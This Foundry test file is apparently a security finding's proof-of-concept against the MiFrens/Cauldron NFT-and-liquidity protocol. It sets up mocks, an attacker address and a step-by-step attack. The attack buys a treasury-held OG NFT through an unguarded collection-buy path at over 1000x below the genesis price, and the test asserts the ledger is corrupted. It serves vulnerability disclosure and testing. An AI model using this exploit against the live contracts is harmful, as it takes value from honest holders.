// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";

import {MiFrensGenesis} from "../../cauldron/MiFrensGenesis.sol";
import {CollectionLedger} from "../../cauldron/CollectionLedger.sol";
import {PoolOps, IPositionManagerOps, ReserveRef} from "../../cauldron/PoolOps.sol";
import {ReserveLib} from "../../cauldron/ReserveLib.sol";

/// @dev Minimal 18-decimal ERC20 standing in for the live iteration token.
contract Tok {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

/// @dev Stands in for the v4 PositionManager for the single-sided reserve top-up
///      that `PoolOps.addToReserve` performs. `addToReserve` approves EXACTLY the
///      amount it wants consumed and measures the consumption as a balance delta,
///      so pulling the whole allowance reproduces the real "fully consumed" case.
contract MockPM {
    address public tok;
    uint128 public liq = 1e30;
    constructor(address t) { tok = t; }
    function getPositionLiquidity(uint256) external view returns (uint128) { return liq; }
    function modifyLiquidities(bytes calldata, uint256) external payable {
        uint256 a = Tok(tok).allowance(msg.sender, address(this));
        if (a > 0) Tok(tok).transferFrom(msg.sender, address(this), a);
    }
}

/// @dev The registry's custody context. `PoolOps`' `external` library functions are
///      DELEGATECALLed, so inside them `address(this)` is this contract — exactly as
///      it is the real `CauldronRegistry` in production. This harness therefore
///      exercises the SHIPPED bodies of `PoolOps.buyCollection` /
///      `PoolOps.recycleCollection` with the registry's own custody semantics.
contract RegistryLike {
    function buy(
        IPositionManagerOps pm, address ledger, address col, address token,
        uint256 gen, uint256 tokenId, address caller, ReserveRef memory r
    ) external returns (uint256) {
        return PoolOps.buyCollection(pm, ledger, col, token, gen, tokenId, caller, r);
    }

    function recycle(
        IPositionManagerOps pm, address ledger, address col,
        uint256 gen, uint256 tokenId, address caller, ReserveRef memory r
    ) external returns (uint256) {
        return PoolOps.recycleCollection(pm, ledger, col, gen, tokenId, caller, r);
    }

    /// @dev Mirrors `CauldronRegistry`'s own ledger calls (it is the sole caller).
    function ledgerRedeem(address ledger, uint256 gen, uint256 mintedNow) external returns (uint256) {
        return CollectionLedger(ledger).redeem(gen, mintedNow);
    }
    function ledgerCredit(address ledger, uint256 gen, uint256 amt) external {
        CollectionLedger(ledger).credit(gen, amt);
    }
    function custody(address col, address from, address to, uint256 id) external {
        MiFrensGenesis(col).custodyTransfer(from, to, id);
    }
}

contract S0xOgTrancheBoughtAtForgedFloor is Test {
    MiFrensGenesis col;
    CollectionLedger ledger;
    RegistryLike reg;
    Tok tok;
    MockPM pm;

    address alice = address(0xA11CE);   // honest OG holder
    address att   = address(0xBADD1E);  // attacker

    uint256 constant GEN = 2;           // the MiFrens continuation generation
    uint256 constant OG_SUPPLY = 3;     // stands in for GENESIS_SUPPLY (1111 on mainnet)

    ReserveRef r;

    function setUp() public {
        // genesisSupply = 3, maxSupply = 6 -> ids 1..3 are the OG tranche,
        // ids 4..6 are the forged (volume) tranche. Same shape as 1111/6969.
        col = new MiFrensGenesis("MiFrens", "MIF", OG_SUPPLY, 6, 0.01 ether, 3, "ipfs://mf/");
        reg = new RegistryLike();
        col.setRegistry(address(reg));
        ledger = new CollectionLedger(address(reg));
        tok = new Tok();
        pm = new MockPM(address(tok));

        (int24 lo, int24 hi) = ReserveLib.reserveTicks(0, 200, 42400);
        r = ReserveRef({
            positionId: 7,
            key: PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(address(tok)),
                fee: 3000,
                tickSpacing: 200,
                hooks: IHooks(address(0))
            }),
            tickLower: lo,
            tickUpper: hi
        });

        vm.deal(alice, 1 ether);
        vm.deal(att, 1 ether);
        // Sell the whole OG tranche so `totalMinted() == OG_SUPPLY`.
        vm.prank(alice); col.mint{value: 0.03 ether}(3);

        tok.mint(att, 1e30);
        vm.prank(att); tok.approve(address(reg), type(uint256).max);
    }

    // ── The two prices the protocol charges for ONE treasury-held OG fren ─────
    //
    //  Door A (intended): `RedemptionExt.buyTreasuryOgFren` -> 2 * floorPerFren()
    //                     = 2 * genesisReserveOutstanding / genesisShares.
    //  Door B (this bug): `CauldronRegistry.buyCollectionNFT(2, ogId)` ->
    //                     2 * CollectionLedger.floorPerNFT(2, totalMinted()).
    //
    //  Door B has no OG-tranche guard, while the MIRROR call on the same
    //  inventory (`PoolOps.recycleCollection`) does.

    /// @dev The genesis floor Door A would have charged, for the same reserve.
    function _genesisFloorPerFren(uint256 genesisReserveOutstanding) internal pure returns (uint256) {
        return genesisReserveOutstanding / OG_SUPPLY; // CauldronBase.floorPerFren()
    }

    struct Result {
        uint256 paidThroughCollectionDoor;
        uint256 priceThroughGenesisDoor;
        uint256 retiredBefore;
        uint256 retiredAfter;
        address ownerAfter;
        bool recycleRevertedWithOgGuard;
    }

    function _run() internal returns (Result memory out) {
        // 1. The forged tranche has accrued a modest live-buyback entitlement.
        //    (Real path: CauldronHook.legacyBuyStep -> materializeLegacyReserve ->
        //    PoolOps.doLegacyNote -> CollectionLedger.credit.)
        reg.ledgerCredit(address(ledger), GEN, 30e18);

        // 2. Somebody recycled a collection NFT, so `retired[GEN] != 0` — the only
        //    precondition `CollectionLedger.buyback` enforces.
        reg.ledgerRedeem(address(ledger), GEN, col.totalMinted());
        out.retiredBefore = ledger.retired(GEN);

        // 3. An OG fren is sitting in the TREASURY. In production this is where
        //    `RedemptionExt.redeemOgFren` puts it (permissionless, any OG owner),
        //    to be resold at 2x the GENESIS floor.
        reg.custody(address(col), alice, address(reg), 1);
        assertEq(col.ownerOf(1), address(reg), "OG fren is in the treasury");

        // 4. The genesis reserve backing that fren. 20% of a 1e27 supply over
        //    OG_SUPPLY frens — the shipped `genesisBonusBps` shape.
        out.priceThroughGenesisDoor = 2 * _genesisFloorPerFren(2e26);

        // 5. THE ATTACK. Buy the OG fren through the COLLECTION door.
        out.paidThroughCollectionDoor =
            reg.buy(IPositionManagerOps(address(pm)), address(ledger), address(col), address(tok), GEN, 1, att, r);

        out.retiredAfter = ledger.retired(GEN);
        out.ownerAfter = col.ownerOf(1);

        // 6. The mirror call on the SAME id is guarded. Prove the asymmetry.
        try reg.recycle(IPositionManagerOps(address(pm)), address(ledger), address(col), GEN, 1, att, r) {
            out.recycleRevertedWithOgGuard = false;
        } catch Error(string memory reason) {
            out.recycleRevertedWithOgGuard =
                keccak256(bytes(reason)) == keccak256(bytes("og tranche"));
        } catch {
            out.recycleRevertedWithOgGuard = false;
        }
    }

    function test_OgFrenLeavesTreasuryAtTheForgedFloor() public {
        Result memory o = _run();

        // (a) The OG fren really left the treasury through the collection door.
        assertEq(o.ownerAfter, att, "attacker now owns OG fren #1");

        // (b) It was priced off the FORGED ledger floor, not the genesis floor.
        assertGt(o.priceThroughGenesisDoor, 0, "genesis door has a price");
        assertGt(o.paidThroughCollectionDoor, 0, "collection door charged something");
        assertLt(
            o.paidThroughCollectionDoor,
            o.priceThroughGenesisDoor / 1000,
            "collection door underprices the senior tranche by >1000x"
        );

        // (c) The ledger un-retired an NFT that was never retired through it:
        //     a phantom claimant now dilutes every real forged holder forever.
        assertEq(o.retiredBefore, 1, "one NFT was retired");
        assertEq(o.retiredAfter, 0, "buyback decremented retired for an OG fren");

        // (d) The guard exists on the mirror call, so this is an omission, not a
        //     design choice.
        assertTrue(o.recycleRevertedWithOgGuard, "recycleCollection DOES guard the OG tranche");
    }
}
